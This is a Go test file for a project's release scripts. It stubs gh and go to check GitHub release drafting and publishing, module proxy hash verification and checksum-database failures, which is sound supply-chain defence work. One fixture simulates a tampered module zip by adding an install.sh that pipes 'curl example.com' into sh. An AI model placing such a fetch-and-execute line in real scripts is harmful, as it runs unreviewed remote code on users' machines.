package scripts

import (
	"archive/zip"
	"bytes"
	"encoding/json"
	"os"
	"path/filepath"
	"slices"
	"strconv"
	"strings"
	"testing"

	"golang.org/x/mod/module"
	"golang.org/x/mod/sumdb/dirhash"
	modzip "golang.org/x/mod/zip"
)

// The release of the fixtures.
const (
	releaseCommit = "1111111111111111111111111111111111111111"
	otherCommit   = "2222222222222222222222222222222222222222"
)

// ghStub stands in for gh. It appends its arguments to the file STUB_LOG names. For release view
// it prints the file view-<n>.json of STUB_DIR, where n counts the views so far, and fails as gh
// does for a release it does not find when there is no such file. For release create and release
// edit it exits with STUB_EXIT. For api repos/octo/repo/git/ref/tags/<tag> it prints the file ref
// of STUB_DIR.
const ghStub = `#!/bin/sh
printf '%s\n' "$*" >>"$STUB_LOG"
case "$1 $2" in
"release view")
	n=$(grep -c '^release view' "$STUB_LOG")
	if [ ! -f "$STUB_DIR/view-$n.json" ]; then
		echo "release not found" >&2
		exit 1
	fi
	cat "$STUB_DIR/view-$n.json"
	;;
"release create" | "release edit") exit "${STUB_EXIT:-0}" ;;
"api repos/octo/repo/git/ref/tags/"*) cat "$STUB_DIR/ref" ;;
*) exit 99 ;;
esac
`

// releaseJSON is gh release view's JSON of a release of v2.1.0, or of v2.1.0-rc.1 when
// prerelease, at the release commit, with the assets.
func releaseJSON(draft, prerelease bool, target string, assets ...string) string {
	tag := "v2.1.0"
	if prerelease {
		tag = "v2.1.0-rc.1"
	}
	var names []string
	for _, a := range assets {
		names = append(names, `{"name": "`+a+`"}`)
	}
	return `{"isDraft": ` + boolText(draft) + `, "isPrerelease": ` + boolText(prerelease) +
		`, "tagName": "` + tag + `", "targetCommitish": "` + target + `", "assets": [` +
		strings.Join(names, ", ") + `]}`
}

func boolText(b bool) string {
	if b {
		return "true"
	}
	return "false"
}

// githubRun is a run of release-github.sh: its arguments after the mode, the views gh prints in
// turn, the tag's commit and gh's exit code for create and edit.
type githubRun struct {
	args   []string
	views  []string
	ref    string
	ghExit string
}

// runGitHub runs release-github.sh with the gh stub, and returns the result and the gh commands
// it ran.
func runGitHub(t *testing.T, mode string, r githubRun) (scriptResult, []string) {
	t.Helper()
	root := t.TempDir()
	copyScripts(t, root, "release-github.sh")
	writeExecutable(t, root, "stub/gh", ghStub)
	stubDir := filepath.Join(root, "stubdir")
	files := map[string]string{
		"stubdir/ref": r.ref, "dist/SHA256SUMS": "sums\n", "dist/m.zip": "zip\n",
		"notes.md": "- A change.\n",
	}
	for i, v := range r.views {
		if v != "" {
			files["stubdir/view-"+string(rune('1'+i))+".json"] = v
		}
	}
	writeFiles(t, root, files)
	log := filepath.Join(root, "gh.log")
	inherited := os.Getenv("PATH") //nolint:forbidigo // the stub goes before it
	env := []string{
		"PATH=" + filepath.Join(root, "stub") + string(os.PathListSeparator) + inherited,
		"STUB_LOG=" + log, "STUB_DIR=" + stubDir, "STUB_EXIT=" + r.ghExit,
		"GITHUB_REPOSITORY=octo/repo",
	}
	result := runScript(t, root, env, filepath.Join(root, ".github/scripts/release-github.sh"),
		append([]string{mode}, r.args...)...)
	data, err := os.ReadFile(log)
	if err != nil && !os.IsNotExist(err) {
		t.Fatal(err)
	}
	return result, strings.Split(strings.TrimSpace(string(data)), "\n")
}

func TestReleaseGitHubDraft(t *testing.T) {
	final := []string{"v2.1.0", releaseCommit, "notes.md", "dist"}
	candidate := []string{"v2.1.0-rc.1", releaseCommit, "notes.md", "dist"}
	complete := []string{"SHA256SUMS", "m.zip"}
	createFinal := "release create v2.1.0 --draft --target " + releaseCommit +
		" --title v2.1.0 --notes-file notes.md dist/SHA256SUMS dist/m.zip"
	createCandidate := "release create v2.1.0-rc.1 --draft --target " + releaseCommit +
		" --title v2.1.0-rc.1 --notes-file notes.md --prerelease dist/SHA256SUMS dist/m.zip"
	tests := []struct {
		name     string
		run      githubRun
		wantExit int
		want     string
		// wantCreate is the gh release create that the script runs, or "" for none.
		wantCreate string
	}{
		{
			name: "a release",
			run: githubRun{args: final, views: []string{
				"",
				releaseJSON(true, false, releaseCommit, complete...),
			}},
			wantExit: 0, want: "release-github: drafted v2.1.0 at " + releaseCommit +
				" with 2 assets\n",
			wantCreate: createFinal,
		},
		{
			name: "a release candidate",
			run: githubRun{args: candidate, views: []string{
				"",
				releaseJSON(true, true, releaseCommit, complete...),
			}},
			wantExit: 0, want: "release-github: drafted v2.1.0-rc.1 at ",
			wantCreate: createCandidate,
		},
		{
			name: "a draft of a release candidate that is not a prerelease",
			run: githubRun{args: candidate, views: []string{
				"",
				releaseJSON(true, false, releaseCommit, complete...),
			}},
			wantExit: 1,
			want: "release-github: FAIL: the draft of v2.1.0-rc.1 must be a prerelease exactly " +
				"when the tag is a release candidate; v2.1.0-rc.1 is one: true, and the draft " +
				"is a prerelease: false\n",
			wantCreate: createCandidate,
		},
		{
			name: "a release that exists",
			run: githubRun{args: final, views: []string{
				releaseJSON(false, false, releaseCommit, complete...),
			}},
			wantExit: 1,
			want:     "release-github: FAIL: a release of v2.1.0 exists already: ",
		},
		{
			name: "a draft without an asset",
			run: githubRun{args: final, views: []string{
				"",
				releaseJSON(true, false, releaseCommit, "SHA256SUMS"),
			}},
			wantExit: 1, want: "release-github: FAIL: the draft of v2.1.0 has no asset m.zip\n",
			wantCreate: createFinal,
		},
		{
			name: "a draft at another commit",
			run: githubRun{args: final, views: []string{
				"",
				releaseJSON(true, false, otherCommit, complete...),
			}},
			wantExit: 1,
			want: "release-github: FAIL: the draft of v2.1.0 targets " + otherCommit +
				", not " + releaseCommit + "\n",
			wantCreate: createFinal,
		},
		{
			name:     "a create that fails",
			run:      githubRun{args: final, views: []string{""}, ghExit: "1"},
			wantExit: 2, want: "release-github: gh release create v2.1.0 failed\n",
			wantCreate: createFinal,
		},
		{
			name:     "a tag that is not a release tag",
			run:      githubRun{args: []string{"v2.1", releaseCommit, "notes.md", "dist"}},
			wantExit: 2, want: "release-github: the tag \"v2.1\" is not a v2 release tag",
		},
		{
			name:     "a commit that is not a hash",
			run:      githubRun{args: []string{"v2.1.0", "HEAD", "notes.md", "dist"}},
			wantExit: 2, want: "release-github: \"HEAD\" is not a full commit hash\n",
		},
		{
			name:     "a directory without SHA256SUMS",
			run:      githubRun{args: []string{"v2.1.0", releaseCommit, "notes.md", "stub"}},
			wantExit: 2, want: "release-github: stub holds no SHA256SUMS\n",
		},
		{
			name:     "no notes",
			run:      githubRun{args: []string{"v2.1.0", releaseCommit, "none.md", "dist"}},
			wantExit: 2, want: "release-github: the notes none.md are not a file\n",
		},
		{
			name:     "no directory",
			run:      githubRun{args: []string{"v2.1.0", releaseCommit, "notes.md"}},
			wantExit: 2, want: "release-github: usage: release-github.sh draft <tag> <sha>",
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result, ran := runGitHub(t, "draft", tt.run)

			if result.exit != tt.wantExit || !strings.Contains(result.stdout, tt.want) {
				t.Errorf("release-github.sh draft exited %d and printed\n%s\nwant %d and %q",
					result.exit, result.stdout, tt.wantExit, tt.want)
			}
			assertRan(t, ran, "release create", tt.wantCreate)
		})
	}
}

// assertRan checks that of the gh commands that ran, those that start with prefix are want
// alone, or none when want is empty.
func assertRan(t *testing.T, ran []string, prefix, want string) {
	t.Helper()
	var got []string
	for _, command := range ran {
		if strings.HasPrefix(command, prefix) {
			got = append(got, command)
		}
	}
	if (want == "" && len(got) > 0) || (want != "" && (len(got) != 1 || got[0] != want)) {
		t.Errorf("gh ran %q, want %q", got, want)
	}
}

func TestReleaseGitHubPublish(t *testing.T) {
	sums := []string{"SHA256SUMS", "m.zip"}
	final := []string{"v2.1.0", releaseCommit}
	candidate := []string{"v2.1.0-rc.1", releaseCommit}
	editFinal := "release edit v2.1.0 --draft=false --latest"
	editCandidate := "release edit v2.1.0-rc.1 --draft=false --prerelease --latest=false"
	tests := []struct {
		name     string
		run      githubRun
		wantExit int
		want     string
		// wantEdit is the gh release edit that the script runs, or "" for none.
		wantEdit string
	}{
		{
			name: "a release becomes the latest",
			run: githubRun{args: final, ref: releaseCommit, views: []string{
				releaseJSON(true, false, releaseCommit, sums...),
				releaseJSON(false, false, releaseCommit, sums...),
			}},
			wantExit: 0, want: "release-github: published v2.1.0 at " + releaseCommit + "\n",
			wantEdit: editFinal,
		},
		{
			name: "a release candidate is a prerelease and never the latest",
			run: githubRun{args: candidate, ref: releaseCommit, views: []string{
				releaseJSON(true, true, releaseCommit, sums...),
				releaseJSON(false, true, releaseCommit, sums...),
			}},
			wantExit: 0, want: "release-github: published v2.1.0-rc.1 at ",
			wantEdit: editCandidate,
		},
		{
			name: "a release candidate whose draft is not a prerelease",
			run: githubRun{args: candidate, ref: releaseCommit, views: []string{
				releaseJSON(true, false, releaseCommit, sums...),
			}},
			wantExit: 1,
			want: "release-github: FAIL: the draft of v2.1.0-rc.1 must be a prerelease " +
				"exactly when the tag is a release candidate;",
		},
		{
			name: "a release whose draft is a prerelease",
			run: githubRun{args: final, ref: releaseCommit, views: []string{
				releaseJSON(true, true, releaseCommit, sums...),
			}},
			wantExit: 1, want: "v2.1.0 is one: false, and the draft is a prerelease: true\n",
		},
		{
			name: "a release candidate that was published as a release",
			run: githubRun{args: candidate, ref: releaseCommit, views: []string{
				releaseJSON(true, true, releaseCommit, sums...),
				releaseJSON(false, false, releaseCommit, sums...),
			}},
			wantExit: 1,
			want: "release-github: FAIL: the published release of v2.1.0-rc.1 is a " +
				"prerelease: false, but v2.1.0-rc.1 is a release candidate: true\n",
			wantEdit: editCandidate,
		},
		{
			name: "a release that is published already",
			run: githubRun{args: final, ref: releaseCommit, views: []string{
				releaseJSON(false, false, releaseCommit, sums...),
			}},
			wantExit: 1,
			want: "release-github: FAIL: the release of v2.1.0 is published already, or is " +
				"not a draft\n",
		},
		{
			name: "a draft without SHA256SUMS",
			run: githubRun{args: final, ref: releaseCommit, views: []string{
				releaseJSON(true, false, releaseCommit, "m.zip"),
			}},
			wantExit: 1,
			want:     "release-github: FAIL: the draft of v2.1.0 has no asset SHA256SUMS\n",
		},
		{
			name: "a release that is still a draft",
			run: githubRun{args: final, ref: releaseCommit, views: []string{
				releaseJSON(true, false, releaseCommit, sums...),
				releaseJSON(true, false, releaseCommit, sums...),
			}},
			wantExit: 1, want: "release-github: FAIL: the release of v2.1.0 is still a draft\n",
			wantEdit: editFinal,
		},
		{
			name: "a tag at another commit",
			run: githubRun{args: final, ref: otherCommit, views: []string{
				releaseJSON(true, false, releaseCommit, sums...),
				releaseJSON(false, false, releaseCommit, sums...),
			}},
			wantExit: 1,
			want: "release-github: FAIL: the tag v2.1.0 points at " + otherCommit + ", not " +
				releaseCommit + ": retract the version in the next patch release",
			wantEdit: editFinal,
		},
		{
			name:     "no draft",
			run:      githubRun{args: final},
			wantExit: 2, want: "release-github: gh release view v2.1.0 failed: there is no " +
				"draft of v2.1.0\n",
		},
		{
			name: "an edit that fails",
			run: githubRun{args: final, ghExit: "1", views: []string{
				releaseJSON(true, false, releaseCommit, sums...),
			}},
			wantExit: 2, want: "release-github: gh release edit v2.1.0 failed\n",
			wantEdit: editFinal,
		},
		{
			name:     "an extra argument",
			run:      githubRun{args: []string{"v2.1.0", releaseCommit, "notes.md"}},
			wantExit: 2, want: "release-github: usage: ",
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result, ran := runGitHub(t, "publish", tt.run)

			if result.exit != tt.wantExit || !strings.Contains(result.stdout, tt.want) {
				t.Errorf("release-github.sh publish exited %d and printed\n%s\nwant %d and %q",
					result.exit, result.stdout, tt.wantExit, tt.want)
			}
			assertRan(t, ran, "release edit", tt.wantEdit)
		})
	}
}

// proxyModule is the module of the proxy fixture.
var proxyModule = module.Version{Path: "example.com/m/v2", Version: "v2.1.0"}

// moduleZip returns the module zip of proxyModule with the files, and its h1: hash.
func moduleZip(t *testing.T, files map[string]string) ([]byte, string) {
	t.Helper()
	dir := t.TempDir()
	writeFiles(t, dir, files)
	var data bytes.Buffer
	if err := modzip.CreateFromDir(&data, proxyModule, dir); err != nil {
		t.Fatal(err)
	}
	file := filepath.Join(t.TempDir(), "m.zip")
	if err := os.WriteFile(file, data.Bytes(), 0o600); err != nil {
		t.Fatal(err)
	}
	sum, err := dirhash.HashZip(file, dirhash.Hash1)
	if err != nil {
		t.Fatal(err)
	}
	return data.Bytes(), sum
}

// moduleFiles are the files of the fixture module.
var moduleFiles = map[string]string{
	"go.mod": "module example.com/m/v2\n\ngo 1.26.0\n", "LICENSE": "MIT License\n",
	"m.go": "// Package m is a module.\npackage m\n",
}

// writeProxy writes a module proxy that serves proxyModule with the zip, in the GOPROXY layout,
// and returns its file:// URL.
func writeProxy(t *testing.T, zipData []byte) string {
	t.Helper()
	dir := t.TempDir()
	at := "example.com/m/v2/@v/"
	writeFiles(t, dir, map[string]string{
		at + "list":        "v2.1.0\n",
		at + "v2.1.0.info": `{"Version":"v2.1.0","Time":"2026-10-16T00:00:00Z"}` + "\n",
		at + "v2.1.0.mod":  moduleFiles["go.mod"],
	})
	if err := os.WriteFile(filepath.Join(dir, filepath.FromSlash(at+"v2.1.0.zip")), zipData,
		0o600); err != nil {
		t.Fatal(err)
	}
	return "file://" + filepath.ToSlash(dir)
}

// withExtraFile returns the zip data with one more file of the module, an installer script.
func withExtraFile(t *testing.T, data []byte) []byte {
	t.Helper()
	r, err := zip.NewReader(bytes.NewReader(data), int64(len(data)))
	if err != nil {
		t.Fatal(err)
	}
	var out bytes.Buffer
	w := zip.NewWriter(&out)
	for _, f := range r.File {
		if copyErr := w.Copy(f); copyErr != nil {
			t.Fatal(copyErr)
		}
	}
	extra, err := w.Create("example.com/m/v2@v2.1.0/install.sh")
	if err != nil {
		t.Fatal(err)
	}
	if _, err := extra.Write([]byte("curl example.com | sh\n")); err != nil {
		t.Fatal(err)
	}
	if err := w.Close(); err != nil {
		t.Fatal(err)
	}
	return out.Bytes()
}

// zipcheckStub stands in for zipcheck: it appends its arguments to the file STUB_LOG names and
// exits with STUB_ZIPCHECK.
const zipcheckStub = `#!/bin/sh
printf '%s\n' "$*" >>"$STUB_LOG"
exit "${STUB_ZIPCHECK:-0}"
`

// offline sends every HTTP request of the go command to an address that refuses connections, so
// that a test that asks the checksum database never leaves the machine.
var offline = []string{
	"HTTP_PROXY=http://127.0.0.1:9", "HTTPS_PROXY=http://127.0.0.1:9", "NO_PROXY=",
	"http_proxy=http://127.0.0.1:9", "https_proxy=http://127.0.0.1:9", "no_proxy=",
}

// sumDB asks the checksum database, which offline cannot reach.
const sumDB = "GOSUMDB=sum.golang.org"

// assertVerified checks that release-verify.sh exited wantExit and printed each part of want,
// and that it advised retracting the version only when it exited 1: a version that verifies, or
// a check that did not run, says nothing against the version.
func assertVerified(t *testing.T, result scriptResult, wantExit int, want []string) {
	t.Helper()
	if result.exit != wantExit {
		t.Errorf("release-verify.sh exited %d, want %d:\n%s%s", result.exit, wantExit,
			result.stdout, result.stderr)
	}
	for _, part := range want {
		if !strings.Contains(result.stdout, part) {
			t.Errorf("release-verify.sh printed\n%s\nwant %q", result.stdout, part)
		}
	}
	if result.exit != 1 && strings.Contains(result.stdout, "retract") {
		t.Errorf("release-verify.sh exited %d and advised retracting the version:\n%s",
			result.exit, result.stdout)
	}
}

// goStub stands in for go, and sleepStub for sleep; both append their command line to the file
// STUB_CALLS names. The nth go prints the files go-<n>.json and go-<n>.err of STUB_DIR, on stdout
// and stderr, and exits with the code in go-<n>.exit; once there is no reply n, it gives the
// reply last.
const (
	goStub = `#!/bin/sh
printf 'go %s\n' "$*" >>"$STUB_CALLS"
n=$(grep -c '^go ' "$STUB_CALLS")
[ -f "$STUB_DIR/go-$n.exit" ] || n=last
cat "$STUB_DIR/go-$n.json"
cat "$STUB_DIR/go-$n.err" >&2
exit "$(cat "$STUB_DIR/go-$n.exit")"
`
	sleepStub = `#!/bin/sh
printf 'sleep %s\n' "$*" >>"$STUB_CALLS"
`
)

// goReply is what the go stub prints for one go mod download -json, and its exit code.
type goReply struct {
	json, stderr string
	exit         int
}

// downloadError is the reply of a go mod download -json of example.com/m/v2@v2.1.0 that failed
// with the error.
func downloadError(t *testing.T, err string) goReply {
	t.Helper()
	quoted, marshalErr := json.Marshal("example.com/m/v2@v2.1.0: " + err)
	if marshalErr != nil {
		t.Fatal(marshalErr)
	}
	return goReply{
		json: `{"Path": "example.com/m/v2", "Version": "v2.1.0", "Error": ` + string(quoted) +
			"}\n",
		exit: 1,
	}
}

// The go command reports a rejection by the checksum database as a checksum mismatch with a
// SECURITY ERROR, which exits 1 at once, and a lookup that failed as "verifying module:" alone,
// which the script asks again and, once the attempts run out, reports as a check that did not
// run, exit 2, not as a version to retract.
func TestReleaseVerifyChecksumDatabase(t *testing.T) {
	const (
		target   = "example.com/m/v2@v2.1.0"
		served   = "h1:BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB="
		recorded = "h1:CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC="
		download = "go mod download -json " + target
		// The texts of the go command's errors.
		security = "\n\nSECURITY ERROR\nThis download does NOT match the one reported by the " +
			"checksum server.\n"
		mismatch = "verifying module: checksum mismatch\n\tdownloaded: " + served +
			"\n\tsum.golang.org: " + recorded
		notFound = "verifying module: " + target + ": reading https://sum.golang.org/lookup/" +
			target + ": 404 Not Found\n\tserver response: not found\n"
		retracting = "release-verify: a published version cannot change: retract it in the next " +
			"patch release, as Releases in CONTRIBUTING.md says\n"
	)
	tests := []struct {
		name    string
		replies []goReply
		// attempts is RELEASE_VERIFY_ATTEMPTS; calls are the commands the stubs ran, in order.
		attempts string
		wantExit int
		want     []string
		calls    []string
	}{
		{
			name: "a checksum mismatch", replies: []goReply{downloadError(t, mismatch+security)},
			attempts: "3", wantExit: 1, calls: []string{download},
			want: []string{
				"release-verify: FAIL: the checksum database rejects " + target + ": " + target +
					": verifying module: checksum mismatch\n",
				retracting, "release-verify: FAIL\n",
			},
		},
		{
			name:     "a checksum mismatch on stderr alone",
			replies:  []goReply{{stderr: "go: " + target + ": " + mismatch + "\n", exit: 1}},
			attempts: "3", wantExit: 1, calls: []string{download},
			want: []string{
				"release-verify: FAIL: the checksum database rejects " + target, retracting,
			},
		},
		{
			name: "a version that the database's answer leaves out",
			replies: []goReply{downloadError(t, "verifying module: checksum missing from sumdb "+
				"response"+security)},
			attempts: "3", wantExit: 1, calls: []string{download},
			want: []string{"release-verify: FAIL: the checksum database rejects ", retracting},
		},
		{
			name:     "a lookup that fails on each attempt",
			replies:  []goReply{downloadError(t, notFound)},
			attempts: "3", wantExit: 2,
			calls: []string{download, "sleep 30", download, "sleep 30", download},
			want: []string{
				"release-verify: attempt 1: the checksum database does not answer for " + target +
					" yet: " + target + ": verifying module: ",
				"release-verify: attempt 2: the checksum database does not answer for ",
				"release-verify: the checksum database sum.golang.org does not answer for " +
					target + " after 3 attempts: ",
				": 404 Not Found\n\tserver response: not found; this says nothing of the " +
					"version: re-run verify\n",
				"release-verify: DID NOT RUN\n",
			},
		},
		{
			name: "a lookup that fails, then succeeds",
			replies: []goReply{downloadError(t, notFound), {
				json: `{"Path": "example.com/m/v2", "Version": "v2.1.0", "Zip": "m.zip", "Sum": "` +
					served + `"}` + "\n",
			}},
			attempts: "3", wantExit: 0, calls: []string{download, "sleep 30", download},
			want: []string{
				"release-verify: attempt 1: the checksum database does not answer for ",
				"release-verify: the checksum database sum.golang.org has the same hash\n",
				"release-verify: PASS\n",
			},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			root := t.TempDir()
			copyScripts(t, root, "release-verify.sh")
			writeExecutable(t, root, "bin/zipcheck", zipcheckStub)
			writeExecutable(t, root, "stub/go", goStub)
			writeExecutable(t, root, "stub/sleep", sleepStub)
			// The script runs in root, so the zip that the go stub names is root's m.zip.
			files := map[string]string{"m.zip": "zip\n"}
			for i, reply := range tt.replies {
				for _, n := range []string{strconv.Itoa(i + 1), "last"} {
					files["stubdir/go-"+n+".json"] = reply.json
					files["stubdir/go-"+n+".err"] = reply.stderr
					files["stubdir/go-"+n+".exit"] = strconv.Itoa(reply.exit)
				}
			}
			writeFiles(t, root, files)
			calls := filepath.Join(root, "calls.log")
			inherited := os.Getenv("PATH") //nolint:forbidigo // the stubs go before it
			env := append([]string{
				"PATH=" + filepath.Join(root, "stub") + string(os.PathListSeparator) + inherited,
				"STUB_CALLS=" + calls, "STUB_DIR=" + filepath.Join(root, "stubdir"),
				"STUB_LOG=" + filepath.Join(root, "zipcheck.log"),
				"GOPROXY=https://proxy.golang.org", sumDB, "RELEASE_VERIFY_ATTEMPTS=" + tt.attempts,
				"ZIPCHECK=",
			}, offline...)

			result := runScript(t, root, env, filepath.Join(root,
				".github/scripts/release-verify.sh"), target, served)

			assertVerified(t, result, tt.wantExit, tt.want)
			ran, err := os.ReadFile(calls)
			if err != nil {
				t.Fatal(err)
			}
			if got := strings.Split(strings.TrimSpace(string(ran)), "\n"); !slices.Equal(got,
				tt.calls) {
				t.Errorf("the stubs ran %q, want %q", got, tt.calls)
			}
		})
	}
}

func TestReleaseVerify(t *testing.T) {
	served, sum := moduleZip(t, moduleFiles)
	tampered := withExtraFile(t, served)
	const otherSum = "h1:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="
	tests := []struct {
		name string
		// zip is what the proxy serves, without a version when nil; args are the script's
		// arguments, and env what changes its environment.
		zip      []byte
		args     []string
		env      []string
		wantExit int
		want     []string
		// zipcheck says whether the script runs zipcheck on the zip of the module cache.
		zipcheck bool
	}{
		{
			name: "the version the release built", zip: served,
			args: []string{"example.com/m/v2@v2.1.0", sum}, wantExit: 0, zipcheck: true,
			want: []string{
				"release-verify: GOSUMDB=off: no checksum database is asked, so only the hash " +
					"of the zip that the proxy serves is checked\n",
				"release-verify: the module proxy serves example.com/m/v2@v2.1.0 with the hash " +
					sum + " of the zip built from the tagged commit\n",
				"release-verify: PASS\n",
			},
		},
		{
			name: "a GOTOOLCHAIN of a Go release that is not installed", zip: served,
			args: []string{"example.com/m/v2@v2.1.0", sum}, env: []string{"GOTOOLCHAIN=go1.99.0"},
			wantExit: 0, zipcheck: true, want: []string{"release-verify: PASS\n"},
		},
		{
			name: "a hash that is not the release's", zip: served,
			args: []string{"example.com/m/v2@v2.1.0", otherSum}, wantExit: 1,
			want: []string{
				"release-verify: FAIL: the module proxy serves example.com/m/v2@v2.1.0 with the " +
					"hash " + sum + ", not " + otherSum + ", the hash of the zip built from the " +
					"tagged commit\n",
				"release-verify: a published version cannot change: retract it in the next " +
					"patch release, as Releases in CONTRIBUTING.md says\n",
				"release-verify: FAIL\n",
			},
		},
		{
			name: "a tampered zip", zip: tampered,
			args: []string{"example.com/m/v2@v2.1.0", sum}, wantExit: 1,
			want: []string{"release-verify: FAIL: the module proxy serves " +
				"example.com/m/v2@v2.1.0 with the hash h1:"},
		},
		{
			name: "a zip that zipcheck fails", zip: served,
			args: []string{"example.com/m/v2@v2.1.0", sum}, env: []string{"STUB_ZIPCHECK=1"},
			wantExit: 1, zipcheck: true,
			want: []string{"release-verify: FAIL: zipcheck fails on the zip that the module " +
				"proxy serves\n"},
		},
		{
			name: "a zip that zipcheck does not check", zip: served,
			args: []string{"example.com/m/v2@v2.1.0", sum}, env: []string{"STUB_ZIPCHECK=2"},
			wantExit: 2, zipcheck: true,
			want: []string{"release-verify: zipcheck did not run on the zip that the module " +
				"proxy serves; it exited 2\n", "release-verify: DID NOT RUN\n"},
		},
		{
			name: "a version that the proxy does not serve",
			args: []string{"example.com/m/v2@v2.1.0", sum}, wantExit: 1,
			want: []string{
				"release-verify: FAIL: the module proxy file://",
				" does not serve example.com/m/v2@v2.1.0 after 1 attempts: ",
			},
		},
		{
			name: "a checksum database that cannot be reached", zip: served,
			args: []string{"example.com/m/v2@v2.1.0", sum}, env: []string{sumDB}, wantExit: 2,
			want: []string{
				"release-verify: the checksum database sum.golang.org does not answer for " +
					"example.com/m/v2@v2.1.0 after 1 attempts: example.com/m/v2@v2.1.0: verifying ",
				"; this says nothing of the version: re-run verify\n",
				"release-verify: DID NOT RUN\n",
			},
		},
		{
			name: "a GONOSUMDB that names the module", zip: served,
			args: []string{"example.com/m/v2@v2.1.0", sum},
			env:  []string{sumDB, "GONOSUMDB=example.com/m/v2"}, wantExit: 2,
			want: []string{"release-verify: the checksum database sum.golang.org does not answer"},
		},
		{
			name: "a GOPRIVATE that names the module", zip: served,
			args:     []string{"example.com/m/v2@v2.1.0", sum},
			env:      []string{"GOPRIVATE=example.com/m/v2"},
			wantExit: 0, zipcheck: true, want: []string{"release-verify: PASS\n"},
		},
		{
			name: "a GONOPROXY that names the module", zip: served,
			args:     []string{"example.com/m/v2@v2.1.0", sum},
			env:      []string{"GONOPROXY=example.com/m/v2"},
			wantExit: 0, zipcheck: true, want: []string{"release-verify: PASS\n"},
		},
		{
			name: "one argument", args: []string{"example.com/m/v2@v2.1.0"}, wantExit: 2,
			want: []string{"release-verify: usage: release-verify.sh <module>@<version> <h1>\n"},
		},
		{
			name: "a module without a version", args: []string{"example.com/m/v2", sum},
			wantExit: 2, want: []string{"\"example.com/m/v2\" is not <module>@<version>\n"},
		},
		{
			name: "a hash that is not h1", args: []string{"example.com/m/v2@v2.1.0", "abc"},
			wantExit: 2, want: []string{"release-verify: \"abc\" is not an h1: hash\n"},
		},
		{
			name: "a proxy with a fallback", args: []string{"example.com/m/v2@v2.1.0", sum},
			env: []string{"GOPROXY=https://proxy.golang.org,direct"}, wantExit: 2,
			want: []string{"GOPROXY \"https://proxy.golang.org,direct\" is not one https:// " +
				"or file:// URL without a fallback\n"},
		},
		{
			name: "no proxy", args: []string{"example.com/m/v2@v2.1.0", sum},
			env: []string{"GOPROXY="}, wantExit: 2, want: []string{"GOPROXY \"\" is not one"},
		},
		{
			name: "a count of attempts that is not a count",
			args: []string{"example.com/m/v2@v2.1.0", sum},
			env:  []string{"RELEASE_VERIFY_ATTEMPTS=0"}, wantExit: 2,
			want: []string{"RELEASE_VERIFY_ATTEMPTS \"0\" is not a count\n"},
		},
		{
			name: "no zipcheck", args: []string{"example.com/m/v2@v2.1.0", sum},
			env: []string{"ZIPCHECK=/nonexistent/zipcheck"}, wantExit: 2,
			want: []string{"release-verify: zipcheck is not at /nonexistent/zipcheck; build it"},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			root := t.TempDir()
			copyScripts(t, root, "release-verify.sh")
			writeExecutable(t, root, "bin/zipcheck", zipcheckStub)
			log := filepath.Join(root, "zipcheck.log")
			proxy := writeProxy(t, tt.zip)
			if tt.zip == nil {
				proxy = "file://" + filepath.ToSlash(t.TempDir())
			}
			env := append([]string{
				"GOPROXY=" + proxy, "GOSUMDB=off", "STUB_LOG=" + log,
				"RELEASE_VERIFY_ATTEMPTS=1", "ZIPCHECK=",
			}, append(offline, tt.env...)...)

			result := runScript(t, root, env, filepath.Join(root,
				".github/scripts/release-verify.sh"), tt.args...)

			assertVerified(t, result, tt.wantExit, tt.want)
			ran, err := os.ReadFile(log)
			if err != nil && !os.IsNotExist(err) {
				t.Fatal(err)
			}
			args := strings.TrimSpace(string(ran))
			onCache := strings.HasPrefix(args, "-zip ") && !strings.Contains(args, "\n") &&
				strings.HasSuffix(args, "/cache/download/example.com/m/v2/@v/v2.1.0.zip")
			if (args != "" || tt.zipcheck) && onCache != tt.zipcheck {
				t.Errorf("zipcheck ran with %q; want it run once on the module cache's zip: %t",
					args, tt.zipcheck)
			}
		})
	}
}
